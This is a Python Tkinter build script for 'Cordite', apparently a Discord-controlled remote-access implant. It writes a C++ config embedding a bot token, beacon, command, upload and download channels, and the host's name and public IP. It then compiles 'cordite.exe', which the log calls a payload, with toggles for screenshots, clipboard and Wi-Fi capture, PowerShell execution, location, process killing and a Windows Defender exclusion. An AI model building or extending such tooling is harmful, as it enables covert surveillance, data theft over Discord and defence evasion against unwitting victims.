import subprocess
import os
import logging
import threading
import tkinter as tk
import shutil

PROJECT_DIR = os.path.abspath(os.path.join("..", "Cordite"))
BUILD_DIR = os.path.join(PROJECT_DIR, "build")

def update_config_cpp(app):
    config_path = os.path.join("..", "Cordite", "src", "core", "config.cpp")
    selected_timezone = app.timezone_var.get()
    timezone_info = app.timezone_data.get(selected_timezone, {"offset": -60, "dst": True})
    timezone_offset = timezone_info["offset"]
    use_dst = "true" if timezone_info["dst"] else "false"

    config_content = f"""#include "core/Config.h"
#include "agents/Callback_utils.h"

namespace config {{
    BotConfig cfg;

    BotConfig initialize_config() {{
        cfg.token = "{app.bot_token}";
        cfg.appId = "{app.app_id}";

        cfg.beacon_chanel_id = "{app.channel_ids.get('beacons', '')}";
        cfg.commands_chanel_id = "{app.channel_ids.get('commands', '')}";
        cfg.download_chanel_id = "{app.channel_ids.get('downloads', '')}";
        cfg.upload_chanel_id = "{app.channel_ids.get('uploads', '')}";

        cfg.w_token = std::wstring(cfg.token.begin(), cfg.token.end());
        cfg.w_appId = std::wstring(cfg.appId.begin(), cfg.appId.end());

        cfg.agent_id = generate_agent_id();
        cfg.hostname = GetHostname();
        cfg.ip = getPublicIP();

        cfg.timezone_name = "{selected_timezone}";
        cfg.timezone_offset_minutes = {timezone_offset};
        cfg.use_dst = {use_dst};

        return cfg;
    }}
}}
"""
    try:
        with open(config_path, "w") as f:
            f.write(config_content)
        logging.info(f"Updated {config_path} with new configuration.")
        app.build_status_label.config(text="Configuration updated in config.cpp.")
        return True
    except Exception as e:
        logging.error(f"Failed to update config.cpp: {str(e)}")
        app.build_status_label.config(text=f"Error updating config.cpp: {str(e)}")
        return False

def update_status(app, text, fg=None):
    app.build_status_label.config(text=text, fg=fg if fg else "#000000")

def stop_progress_bar(app):
    app.progress_bar.stop()
    app.progress_bar.pack_forget()
    app.building = False

def run_build(app, enable_screenshot, enable_debug, enable_download, enable_upload, enable_wifi, enable_kill, enable_clipboard, enable_powershell, enable_DEFENDER_EXCLUSION, enable_cleandead, enable_applications, enable_sysinfo, enable_ps, enable_reregister, enable_location, enable_cd_dir):
    try:
        cmake_path = app.cmake_path.strip()
        if not cmake_path or not os.path.exists(cmake_path):
            app.root.after(0, update_status, app, f"Invalid CMake path: {cmake_path}", "#FF0000")
            logging.error(f"Invalid or missing CMake path: {cmake_path}")
            return

        if os.path.exists(BUILD_DIR):
            os.system(f'rmdir /S /Q "{BUILD_DIR}"')
        os.makedirs(BUILD_DIR, exist_ok=True)

        configure_cmd = [
            cmake_path,
            "-S", PROJECT_DIR,
            "-B", BUILD_DIR,
            "-A", "x64",
            f"-DENABLE_SCREENSHOT={'ON' if enable_screenshot else 'OFF'}",
            f"-DDEBUG_MODE={'ON' if enable_debug else 'OFF'}",
            f"-DENABLE_DOWNLOAD={'ON' if enable_download else 'OFF'}",
            f"-DENABLE_UPLOAD={'ON' if enable_upload else 'OFF'}",
            f"-DENABLE_WIFI={'ON' if enable_wifi else 'OFF'}",
            f"-DENABLE_CLIPBOARD={'ON' if enable_clipboard else 'OFF'}",
            f"-DENABLE_APPLICATIONS={'ON' if enable_applications else 'OFF'}",
            f"-DENABLE_SYSINFO={'ON' if enable_sysinfo else 'OFF'}",
            f"-DENABLE_PROCESSES={'ON' if enable_ps else 'OFF'}",
            f"-DENABLE_REREGISTER={'ON' if enable_reregister else 'OFF'}",
            f"-DENABLE_CLEANDEAD={'ON' if enable_cleandead else 'OFF'}",
            f"-DENABLE_POWERSHELL={'ON' if enable_powershell else 'OFF'}",
            f"-DENABLE_KILL={'ON' if enable_kill else 'OFF'}",
            f"-DENABLE_LOCATION={'ON' if enable_location else 'OFF'}",
            f"-DENABLE_DEFENDER_EXCLUSION={'ON' if enable_DEFENDER_EXCLUSION else 'OFF'}",
            f"-DENABLE_CD_DIR={'ON' if enable_cd_dir else 'OFF'}"
        ]
        logging.info(f"Configuring CMake: {' '.join(configure_cmd)}")
        process = subprocess.Popen(configure_cmd, cwd=PROJECT_DIR, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            app.root.after(0, update_status, app, "CMake configuration failed", "#FF0000")
            logging.error(f"CMake config failed. Output: {stdout.decode()}. Error: {stderr.decode()}")
            return

        build_cmd = [cmake_path, "--build", BUILD_DIR, "--config", "Release"]
        logging.info(f"Executing build command: {' '.join(build_cmd)}")
        process = subprocess.Popen(build_cmd, cwd=PROJECT_DIR, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        returncode = process.returncode
        stdout_str = stdout.decode('utf-8', errors='replace')
        stderr_str = stderr.decode('utf-8', errors='replace')

        if returncode == 0:
            dest_exe = os.path.join(BUILD_DIR, "cordite.exe")
            if not os.path.exists(dest_exe):
                app.root.after(0, update_status, app, "Build succeeded, but cordite.exe not found", "#FF0000")
                logging.error(f"cordite.exe not found in {BUILD_DIR}")
                return

            for item in os.listdir(BUILD_DIR):
                item_path = os.path.join(BUILD_DIR, item)
                if item != "cordite.exe":
                    if os.path.isfile(item_path):
                        os.remove(item_path)
                        logging.info(f"Deleted file: {item_path}")
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path)
                        logging.info(f"Deleted directory: {item_path}")

            app.root.after(0, update_status, app, f"Built successfully, output at {dest_exe}", "#00FF00")
            logging.info(f"Payload built successfully. Output: {stdout_str}")
        else:
            app.root.after(0, update_status, app, "Build failed", "#FF0000")
            logging.error(f"Build failed. Return code: {returncode}. Output: {stdout_str}. Error: {stderr_str}")
    except Exception as e:
        app.root.after(0, update_status, app, f"Build error: {str(e)}", "#FF0000")
        logging.exception(f"Build error: {str(e)}")
    finally:
        app.root.after(0, stop_progress_bar, app)

def build_solution(app):
    if app.building:
        app.build_status_label.config(text="Build already in progress.")
        return
    app.building = True
    app.build_status_label.config(text="Building...")
    app.progress_bar.pack(anchor="w", padx=10, pady=5)
    app.progress_bar.start()

    if not app.bot_token or not all(app.channel_ids.get(ch) for ch in ["beacons", "commands", "uploads", "downloads"]):
        app.build_status_label.config(text="Error: Missing bot token or channel IDs.")
        app.progress_bar.stop()
        app.progress_bar.pack_forget()
        app.building = False
        return
    if not app.app_id:
        app.build_status_label.config(text="Error: Application ID not fetched yet.")
        app.progress_bar.stop()
        app.progress_bar.pack_forget()
        app.building = False
        return
    if not update_config_cpp(app):
        app.progress_bar.stop()
        app.progress_bar.pack_forget()
        app.building = False
        return

    installed_modules = app.installed_listbox.get(0, tk.END)
    logging.info(f"Selected modules: {installed_modules}")
    app.build_status_label.config(text=f"Selected modules: {', '.join(installed_modules)}")

    enable_screenshot = "screenshot" in installed_modules
    enable_download = "download" in installed_modules
    enable_upload = "upload" in installed_modules
    enable_wifi = "wifi" in installed_modules
    enable_clipboard = "clipboard" in installed_modules
    enable_applications = "applications" in installed_modules
    enable_sysinfo = "sysinfo" in installed_modules
    enable_ps = "ps" in installed_modules
    enable_reregister = "re-register" in installed_modules
    enable_DEFENDER_EXCLUSION = "defender-exclusion" in installed_modules
    enable_cleandead = "clean-dead" in installed_modules
    enable_powershell = "powershell" in installed_modules
    enable_kill = "kill" in installed_modules
    enable_location = "location" in installed_modules
    enable_cd_dir = "cd and dir" in installed_modules
    enable_debug = app.debug_mode_var.get()

    flags = {
        "ENABLE_SCREENSHOT": enable_screenshot,
        "DEBUG_MODE": enable_debug,
        "ENABLE_DOWNLOAD": enable_download,
        "ENABLE_UPLOAD": enable_upload,
        "ENABLE_WIFI": enable_wifi,
        "ENABLE_CLIPBOARD": enable_clipboard,
        "ENABLE_APPLICATIONS": enable_applications,
        "ENABLE_SYSINFO": enable_sysinfo,
        "ENABLE_PROCESSES": enable_ps,
        "ENABLE_REREGISTER": enable_reregister,
        "ENABLE_CLEANDEAD": enable_cleandead,
        "ENABLE_POWERSHELL": enable_powershell,
        "ENABLE_KILL": enable_kill,
        "ENABLE_LOCATION": enable_location,
        "ENABLE_DEFENDER_EXCLUSION": enable_DEFENDER_EXCLUSION,
        "ENABLE_CD_DIR": enable_cd_dir,
    }

    for key, value in flags.items():
        logging.info(f"{key}={value}")

    build_thread = threading.Thread(target=run_build, args=(
        app, enable_screenshot, enable_debug, enable_download, enable_upload, enable_wifi,
        enable_kill, enable_clipboard, enable_powershell, enable_DEFENDER_EXCLUSION,
        enable_cleandead, enable_applications, enable_sysinfo, enable_ps, enable_reregister, enable_location,
        enable_cd_dir))
    build_thread.start()